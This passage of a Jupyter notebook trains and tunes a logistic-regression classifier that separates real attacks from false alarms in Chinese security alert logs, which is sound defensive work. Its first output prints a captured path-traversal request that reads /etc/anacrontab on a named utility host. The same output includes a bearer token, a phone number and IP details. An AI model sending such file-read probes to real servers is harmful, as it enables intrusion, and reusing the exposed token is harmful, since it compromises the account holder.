qY2lMQ0oxYzJWeVZIbHdaU0k2TUN3aWNIZGtSWGh3YVhKaGRHbHZibFJwYldVaU9qRTNNemN6TURBMU5USXdNREFzSW5WelpYSnVZVzFsSWpvaVlYTmhabUZtWmlKOS5PcVhBVWJNRkhXT2NaNTZPclFWY2dLblFPVmpMTVN2NGhvZjVsSF9KS3ZybXFDTjhRSkswNDA3S3h0UUp0dEo0WlRLSDdOQlRrNnZGTmlOd1ZGUkRMUTsgdXVpZD0yMDAzMDI5OQ0KDQo=\", \"req_body\": \"\", \"rsp_header\": \"SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54DQpEYXRlOiBXZWQsIDI3IE5vdiAyMDI0IDE1OjQ2OjM5IEdNVA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9VVRGLTgNCkNvbnRlbnQtTGVuZ3RoOiAxMzcNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNClZhcnk6IE9yaWdpbg0KVmFyeTogQWNjZXNzLUNvbnRyb2wtUmVxdWVzdC1NZXRob2QNClZhcnk6IEFjY2Vzcy1Db250cm9sLVJlcXVlc3QtSGVhZGVycw0KWC1GcmFtZS1PcHRpb25zOiBBbGxvd0FsbA0KUmVmZXJyZXItUG9saWN5OiBuby1yZWZlcnJlcg0KWC1Eb3dubG9hZC1PcHRpb25zOiBub29wZW4NClN0cmljdC1UcmFuc3BvcnQtU2VjdXJpdHk6IG1heC1hZ2U9MTU1NTIwMDANCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBkZWZhdWx0LXNyYyAnc2VsZicgc3RhdGljNC5zZWd3YXkuY29tKOivpeWcsOWdgOaMiemcgOS/ruaUuSkgJ3Vuc2FmZS1pbmxpbmUnICd1bnNhZmUtZXZhbCcgYmxvYjogZGF0YTogOw0KWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZg0KWC1YU1MtUHJvdGVjdGlvbjogMTttb2RlPWJsb2NrDQpYLVBlcm1pdHRlZC1Dcm9zcy1Eb21haW4tUG9saWNpZXM6IG5vbmUNCg0K\", \"rsp_body\": \"ewoJImNvZGUiOjUwMCwKCSJtZXNzYWdlIjoi6Z2e5rOV6Lev5b6E77yM6K+l5o6l5Y+j5LuF5o+Q5L6bcHVibGlj55uu5b2V5LiL5paH5Lu25rWB6I635Y+WIiwKCSJwYWdlIjpudWxsLAoJInJlc3VsdCI6bnVsbCwKCSJ0aW1lIjpudWxsCn0=\"}, \"host\": \"zhny.hn.sgcc.com.cn\", \"host_state\": \"企图\", \"accept-language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"rsp_body\": \"{\\n\\t\\\"code\\\":500,\\n\\t\\\"message\\\":\\\"非法路径，该接口仅提供public目录下文件流获取\\\",\\n\\t\\\"page\\\":null,\\n\\t\\\"result\\\":null,\\n\\t\\\"time\\\":null\\n}\", \"rule_desc\": \"网页漏洞利用\", \"proto\": \"http\", \"alarm_id\": \"20241127_f74d1c21cac0d5abacccd10a1b3ac7ca\", \"access_time\": \"2024-11-27 23:46:39\", \"attack_addr\": \"中国--江苏省--南京市(32.053245/118.766351)\", \"sec-fetch-site\": \"none\", \"type_chain\": \"16160000\", \"dip_addr\": \"中国--湖南省--长沙市\", \"rsp_status\": \"200\", \"branch_id\": \"QbJK/fzEi\", \"att_ck\": \"初始访问:TA0001|利用面向公众的应用程序:T1190\", \"upgrade-insecure-requests\": \"1\", \"sip\": \"183.209.50.59\", \"dimension\": \"3\", \"url_path\": \"/gateway/support/oss/getPublicInputStream\", \"src_mac\": \"00:24:ac:22:84:33\", \"file_name\": \"\", \"confidence\": \"高\", \"rsp_header\": \"HTTP/1.1 200 OK\\r\\nServer: nginx\\r\\nDate: Wed, 27 Nov 2024 15:46:39 GMT\\r\\nContent-Type: application/json;charset=UTF-8\\r\\nContent-Length: 137\\r\\nConnection: keep-alive\\r\\nVary: Origin\\r\\nVary: Access-Control-Request-Method\\r\\nVary: Access-Control-Request-Headers\\r\\nX-Frame-Options: AllowAll\\r\\nReferrer-Policy: no-referrer\\r\\nX-Download-Options: noopen\\r\\nStrict-Transport-Security: max-age=15552000\\r\\nContent-Security-Policy: default-src 'self' static4.segway.com(该地址按需修改) 'unsafe-inline' 'unsafe-eval' blob: data: ;\\r\\nX-Content-Type-Options: nosniff\\r\\nX-XSS-Protection: 1;mode=block\\r\\nX-Permitted-Cross-Domain-Policies: none\\r\\n\\r\\n\", \"super_type\": \"攻击利用\", \"serial_num\": \"QbJK/jYtc\", \"tcp_option\": \"\", \"req_header\": \"GET /gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab HTTP/1.1\\r\\nHost: zhny.hn.sgcc.com.cn\\r\\nConnection: keep-alive\\r\\nsec-ch-ua: \\\"Chromium\\\";v=\\\"128\\\", \\\"Not;A=Brand\\\";v=\\\"24\\\", \\\"Google Chrome\\\";v=\\\"128\\\"\\r\\nsec-ch-ua-mobile: ?0\\r\\nsec-ch-ua-platform: \\\"Windows\\\"\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nSec-Fetch-Site: none\\r\\nSec-Fetch-Mode: navigate\\r\\nSec-Fetch-User: ?1\\r\\nSec-Fetch-Dest: document\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\r\\nCookie: sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191d59a55edcf2-05bd8f349acb414-26001e51-2073600-191d59a55eef89%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODkifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%221935eec21f6967-011a48e8b28415-26001151-2073600-1935eec21f814be%22%7D; access_token=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJzeXNUeXBlIjoiWkhOWV9XRUIiLCJhdXRob3JpdGllc1NldCI6WyIwMjE4Il0sImZpcnN0TG9naW4iOmZhbHNlLCJsb2dpblR5cGUiOiJVU0VSTkFNRV9QV0QiLCJyb2xlcyI6IiIsInNvdXJjZSI6IjAxIiwicm9sZXNTZXQiOltdLCJlbmFibGVkIjoxLCJ0b2tlbktleSI6ImFzYWZhZmYuMjAyNDExMjcwMDUwMDQ3MDMiLCJleHBpcmVkIjowLCJsb2dpblRpbWUiOjE3MzI2Mzk4MDQ3MDMsInVzZXJTdGF0ZSI6MSwiaWQiOjIwMDMwMjk5LCJsb2NrZWQiOjAsImlhdCI6MTczMjYzOTgwNCwiZ3JvdXBDb2RlIjoiMDIxOCIsImlzU2VydmljZVN0YXRpb24iOjAsImlzQ2hpbGRVc2VyIjpmYWxzZSwiYXV0aG9yaXRpZXNHQSI6W3siYXV0aG9yaXR5IjoiMDIxOCJ9XSwicHJvdG9jb2xTaWduIjoiMSIsImF1dGhvcml0aWVzIjoiMDIxOCIsImhvbWVSb3V0ZXIiOiIvc3lzU2V0dGluZy9wZXJzb25hbENlbnRlciIsInBob25lIjoiMTgwNjE4NDM5MjciLCJ1c2VyVHlwZSI6MCwicHdkRXhwaXJhdGlvblRpbWUiOjE3MzczMDA1NTIwMDAsInVzZXJuYW1lIjoiYXNhZmFmZiJ9.OqXAUbMFHWOcZ56OrQVcgKnQOVjLMSv4hof5lH_JKvrmqCN8QJK0407KxtQJttJ4ZTKH7NBTk6vFNiNwVFRDLQ; uuid=20030299\\r\\n\\r\\n\", \"req_body\": \"\", \"sec-ch-ua-platform\": \"\\\"Windows\\\"\", \"rule_state\": \"green\", \"asset_group\": \"省公司\", \"ioc\": \"268569450-敏感信息扫描(机器学习)\", \"rule_labels\": \"{}\", \"sport\": \"36228\", \"h_url\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\"}\n",
      "攻击\n"
     ]
    }
   ],
   "source": [
    "from datasets import load_dataset\n",
    "import pandas as pd\n",
    "\n",
    "ds = load_dataset(\"tiangler/cybersecurity_alarm_analysis\")\n",
    "\n",
    "# 提取 input 和 output\n",
    "train_inputs = ds[\"train\"][\"input\"]\n",
    "train_labels = ds[\"train\"][\"output\"]\n",
    "\n",
    "# 看前几条\n",
    "print(train_inputs[0])\n",
    "print(train_labels[0])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "25650124",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "敏感信息扫描(机器学习) 敏感信息/重要文件泄漏 /gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab {'req_header': 'R0VUIC9nYXRld2F5L3N1cHBvcnQvb3NzL2dldFB1YmxpY0lucHV0U3RyZWFtP2ZpbGVQYXRoPS9ldGMvYW5hY3JvbnRhYiBIVFRQLzEuMQ0KSG9zdDogemhueS5obi5zZ2NjLmNvbS5jbg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiQ2hyb21pdW0iO3Y9IjEyOCIsICJOb3Q7QT1CcmFuZCI7dj0iMjQiLCAiR29vZ2xlIENocm9tZSI7dj0iMTI4Ig0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpV\n",
      "攻击\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "# 提取关键信息当作文本特征\n",
    "def extract_features(x):\n",
    "    try:\n",
    "        data = json.loads(x)\n",
    "        # 挑一些代表性字段拼成字符串\n",
    "        fields = [\n",
    "            data.get(\"vuln_type\",\"\"),\n",
    "            data.get(\"attack_type\",\"\"),\n",
    "            data.get(\"uri\",\"\"),\n",
    "            str(data.get(\"payload\",\"\")),\n",
    "            data.get(\"detail_info\",\"\")\n",
    "        ]\n",
    "        return \" \".join(fields)\n",
    "    except Exception:\n",
    "        return x  # 解析失败就用原始字符串\n",
    "\n",
    "# 从整个数据集批量提取\n",
    "texts = [extract_features(x) for x in ds[\"train\"][\"input\"]]\n",
    "labels = ds[\"train\"][\"output\"]\n",
    "\n",
    "print(texts[0][:500])  # 看前500个字符\n",
    "print(labels[0])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "b7c55ee5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "          攻击       0.97      0.58      0.73        64\n",
      "          误报       1.00      1.00      1.00     12963\n",
      "\n",
      "    accuracy                           1.00     13027\n",
      "   macro avg       0.99      0.79      0.86     13027\n",
      "weighted avg       1.00      1.00      1.00     13027\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.metrics import classification_report\n",
    "\n",
    "# 划分训练/测试\n",
    "X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.2, random_state=42)\n",
    "\n",
    "# 文本向量化\n",
    "vec = TfidfVectorizer(max_features=8000)\n",
    "X_train_vec = vec.fit_transform(X_train)\n",
    "X_test_vec = vec.transform(X_test)\n",
    "\n",
    "# 训练分类器\n",
    "clf = LogisticRegression(max_iter=1000)\n",
    "clf.fit(X_train_vec, y_train)\n",
    "\n",
    "# 评估\n",
    "y_pred = clf.predict(X_test_vec)\n",
    "print(classification_report(y_test, y_pred))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "b2329c79",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "          攻击       0.63      1.00      0.78        64\n",
      "          误报       1.00      1.00      1.00     12963\n",
      "\n",
      "    accuracy                           1.00     13027\n",
      "   macro avg       0.82      1.00      0.89     13027\n",
      "weighted avg       1.00      1.00      1.00     13027\n",
      "\n"
     ]
    }
   ],
   "source": [
    "clf = LogisticRegression(max_iter=1000, class_weight='balanced')\n",
    "clf.fit(X_train_vec, y_train)\n",
    "y_pred = clf.predict(X_test_vec)\n",
    "print(classification_report(y_test, y_pred))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "e6421ca1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best threshold=0.93 | 攻击类 P=0.905, R=0.983, F1≈0.942\n"
     ]
    }
   ],
   "source": [
    "# 1) TF-IDF + 逻辑回归（已跑通）——加权\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.metrics import precision_recall_fscore_support, classification_report\n",
    "import numpy as np, json\n",
    "\n",
    "# texts, labels 见你上一步的提取；若还没做，沿用你已写的 extract_features()\n",
    "X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.2, stratify=labels, random_state=42)\n",
    "\n",
    "vec = TfidfVectorizer(max_features=8000)\n",
    "X_tr = vec.fit_transform(X_train); X_te = vec.transform(X_test)\n",
    "\n",
    "clf = LogisticRegression(max_iter=2000, class_weight='balanced', n_jobs=-1)\n",
    "clf.fit(X_tr, y_train)\n",
    "\n",
    "# 2) 阈值扫一遍，选最合适的阈值（例如 F0.5 更偏向精准率，F2 更偏向召回）\n",
    "pos = '攻击'\n",
    "p = clf.predict_proba(X_te)[:, list(clf.classes_).index(pos)]\n",
    "ths = np.linspace(0.8, 1, 1000)  # 你也可以自己定义一组阈值\n",
    "\n",
    "def fbeta(p,y,th,beta=1.0):\n",
    "    pred = np.where(p>=th, pos, '误报')\n",
    "    pr, rc, f1, _ = precision_recall_fscore_support(y, pred, labels=[pos,'误报'],zero_division=0)\n",
    "    # 取“攻击”这一类的P/R计算F_beta\n",
    "    P, R = pr[0], rc[0]\n",
    "    if P+R==0: return 0, P, R\n",
    "    fbeta = (1+beta**2)*P*R/(beta**2*P+R+1e-12)\n",
    "    return fbeta, P, R\n",
    "# 计算每个阈值的指标\n",
    "results = []\n",
    "for t in ths:\n",
    "    fbeta_val, P, R = fbeta(p, y_test, t, beta=1.0)\n",
    "    results.append(((fbeta_val, P, R), t))\n",
    "\n",
    "# 取最优\n",
    "(best_f, bestP, bestR), best_th = max(results, key=lambda x: x[0][0])\n",
    "\n",
    "print(f\"Best threshold={best_th:.2f} | 攻击类 P={bestP:.3f}, R={bestR:.3f}, F1≈{best_f:.3f}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "b095e1e7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "最佳阈值=0.939222 | P=0.905 R=0.983 F1=0.942\n"
     ]
    }
   ],
   "source": [
    "import numpy as np\n",
    "from sklearn.metrics import precision_recall_curve\n",
    "\n",
    "# 把标签二值化：攻击=1，其余=0\n",
    "y_true = (np.array(y_test) == '攻击').astype(int)\n",
    "\n",
    "# p 是你已经算好的“属于攻击”的概率\n",
    "prec, rec, ths = precision_recall_curve(y_true, p)  # 注意: ths长度=prec长度-1\n",
    "\n",
    "# 在所有阈值上计算 F1（或 Fβ）\n",
    "beta = 1.0\n",
    "F = (1+beta**2) * prec[:-1] * rec[:-1] / (beta**2 * prec[:-1] + rec[:-1] + 1e-12)\n",
    "\n",
    "best_idx = np.nanargmax(F)\n",
    "best_th = ths[best_idx]\n",
    "bestP, bestR, bestF = prec[best_idx], rec[best_idx], F[best_idx]\n",
    "print(f\"最佳阈值={best_th:.6f} | P={bestP:.3f} R={bestR:.3f} F1={bestF:.3f}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "807ee1e9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "          攻击       0.90      0.97      0.93        58\n",
      "          误报       1.00      1.00      1.00     12969\n",
      "\n",
      "    accuracy                           1.00     13027\n",
      "   macro avg       0.95      0.98      0.97     13027\n",
      "weighted avg       1.00      1.00      1.00     13027\n",
      "\n"
     ]
    }
   ],
   "source": [
    "best_threshold = 0.939222  # 你算出来的值\n",
    "\n",
    "# 对测试集打分并判别\n",
    "y_pred_final = np.where(p >= best_threshold, '攻击', '误报')\n",
    "print(classification_report(y_test, y_pred_final))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "9d6448b9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "TfidfVectorizer(max_features=8000)\n",
      "LogisticRegression(class_weight='balanced', max_iter=2000)\n",
      "coef_ shape: (1, 8000) classes: ['攻击' '误报']\n",
      "注意：模型为二分类，coef_ shape=(1, n_features)。该单行系数对应类 '误报'。如果需要，'攻击' 的系数等于取反。\n",
      "已导出系数到 logreg_coefs_fixed.csv\n",
      "Top positive features for class '攻击':\n",
      "  www\t4.014380\n",
      "  218\t3.321932\n",
      "  jsp\t3.201631\n",
      "  2e\t3.173770\n",
      "  30001\t3.021761\n",
      "  新加坡\t2.910784\n",
      "  cve\t2.907815\n",
      "  发现nmap探测行为\t2.609954\n",
      "  68\t2.520490\n",
      "  agent\t2.518982\n",
      "  146\t2.456652\n",
      "  机器学习\t2.375667\n",
      "  windows\t2.278071\n",
      "  76\t2.260736\n",
      "  realtek\t2.091920\n",
      "  hn\t1.975539\n",
      "  160\t1.900512\n",
      "  git\t1.874087\n",
      "  compatible\t1.862811\n",
      "  js\t1.832468\n",
      "Top negative features for class '攻击':\n",
      "  172\t-4.194921\n",
      "  null\t-3.766972\n",
      "  发现使用远程连接工具向日葵\t-3.028038\n",
      "  isc\t-2.933844\n",
      "  22\t-2.541026\n",
      "  31\t-2.539155\n",
      "  200\t-2.425912\n",
      "  617934985\t-2.409219\n",
      "  dns\t-2.384798\n",
      "  client_group_ip\t-2.275754\n",
      "  19\t-2.106664\n",
      "  qbjk\t-2.051079\n",
      "  3b\t-2.008617\n",
      "  192\t-2.004428\n",
      "  group\t-1.959723\n",
      "  224\t-1.861707\n",
      "  nx\t-1.817841\n",
      "  132\t-1.807025\n",
      "  弱口令\t-1.794730\n",
      "  发现有弱口令登录行为\t-1.790036\n"
     ]
    }
   ],
   "source": [
    "import joblib\n",
    "with open('tfidf_vec.pkl', 'rb') as f:\n",
    "    vec = joblib.load(f)\n",
    "\n",
    "with open('logreg_model.pkl', 'rb') as f:\n",
    "    model = joblib.load(f)\n",
    "\n",
    "\n",
    "print(vec)  # 看看向量化器\n",
    "print(model)  # 看看模型\n",
    "# 假设 vec, model 已经用了 joblib.load 加载并可用\n",
    "import numpy as np\n",
    "import csv\n",
    "\n",
    "# 获取 feature names（兼容老/新 sklearn）\n",
    "try:\n",
    "    feature_names = vec.get_feature_names_out()\n",
    "except:\n",
    "    feature_names = None\n",
    "\n",
    "if feature_names is None:\n",
    "    inv = {i: t for t, i in vec.vocabulary_.items()}\n",
    "    feature_names = [inv.get(i, \"\") for i in range(len(inv))]\n",
    "\n",
    "coef = getattr(model, \"coef_\", None)\n",
    "classes = getattr(model, \"classes_\", None)\n",
    "if coef is None or classes is None:\n",
    "    print(\"模型没有 coef_ 或 classes_ 属性；无法导出系数。\")\n",
    "else:\n",
    "    print(\"coef_ shape:\", coef.shape, \"classes:\", classes)\n",
    "\n",
    "    # 处理二分类单行系数情况\n",
    "    rows = []  # 每项: (class_name, feature_index, feature_name, weight)\n",
    "    if coef.shape[0] == len(classes):\n",
    "        # 每行对应一个类（多类或 sklearn 已返回每类系数）\n",
    "        for c_idx, cls in enumerate(classes):\n",
    "            for i, fname in enumerate(feature_names):\n",
    "                rows.append([cls, i, fname, float(coef[c_idx, i])])\n",
    "    elif coef.shape[0] == 1 and len(classes) == 2:\n",
    "        # sklearn 二分类常见：coef_[0] 对应 classes_[1]（正类）\n",
    "        pos_cls = classes[1]\n",
    "        neg_cls = classes[0]\n",
    "        w = coef[0]\n",
    "        # 写入正类（classes_[1]）的权重（直接写 coef）\n",
    "        for i, fname in enumerate(feature_names):\n",
    "            rows.append([pos_cls, i, fname, float(w[i])])\n",
    "        # 如果想要为负类也写一列，可以把权重取反写入（可选）\n",
    "        # for i, fname in enumerate(feature_names):\n",
    "        #     rows.append([neg_cls, i, fname, float(-w[i])])\n",
    "        print(f\"注意：模型为二分类，coef_ shape=(1, n_features)。该单行系数对应类 '{pos_cls}'。如果需要，'{neg_cls}' 的系数等于取反。\")\n",
    "    else:\n",
    "        # 其他不常见情况，尽量写出现有行并标注\n",
    "        for r_idx in range(coef.shape[0]):\n",
    "            cls_name = classes[r_idx] if r_idx < len(classes) else f\"row{r_idx}\"\n",
    "            for i, fname in enumerate(feature_names):\n",
    "                rows.append([cls_name, i, fname, float(coef[r_idx, i])])\n",
    "        print(\"注意：coef 行数 与 classes 数不匹配，已按现有行写出。\")\n",
    "\n",
    "    # 导出到 CSV（按行写）\n",
    "    out_csv = \"logreg_coefs_fixed.csv\"\n",
    "    with open(out_csv, \"w\", newline='', encoding=\"utf-8\") as f:\n",
    "        writer = csv.writer(f)\n",
    "        writer.writerow([\"class\", \"feature_index\", \"feature_name\", \"weight\"])\n",
    "        writer.writerows(rows)\n",
    "    print(\"已导出系数到\", out_csv)\n",
    "\n",
    "    # 同时打印 top-k 正负特征（对正类）\n",
    "    target_class = '攻击'\n",
    "    if target_class in classes:\n",
    "        # 得到正类对应的权重向量（兼容二分类 single-row 情况）\n",
    "        if coef.shape[0] == len(classes):\n",
    "            cls_idx = list(classes).index(target_class)\n",
    "            weights = coef[cls_idx]\n",
    "        elif coef.shape[0] == 1 and len(classes) == 2:\n",
    "            # 单行 coef 对应 classes_[1]\n",
    "            if classes[1] == target_class:\n",
    "                weights = coef[0]\n",
    "            else:\n",
    "                # target_class 是负类，则权重为 -coef[0]\n",
    "                weights = -coef[0]\n",
    "        else:\n",
    "            # 兜底\n",
    "            cls_idx = list(classes).index(target_class) if target_class in classes and list(classes).index(target_class) < coef.shape[0] else 0\n",
    "            weights = coef[cls_idx]\n",
    "\n",
    "        weights = np.asarray(weights).ravel()\n",
    "        top_pos_idx = np.argsort(weights)[-20:][::-1]\n",
    "        top_neg_idx = np.argsort(weights)[:20]\n",
    "\n",
    "        print(\"Top positive features for class '{}':\".format(target_class))\n",
    "        for i in top_pos_idx:\n",
    "            print(f\"  {feature_names[i]}\\t{weights[i]:.6f}\")\n",
    "        print(\"Top negative features for class '{}':\".format(target_class))\n",
    "        for i in top_neg_idx:\n",
    "            print(f\"  {feature_names[i]}\\t{weights[i]:.6f}\")\n",
    "    else:\n",
    "        print(f\"目标类 '{target_class}' 不在 classes 中：\", classes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "556e16da",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "agent",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
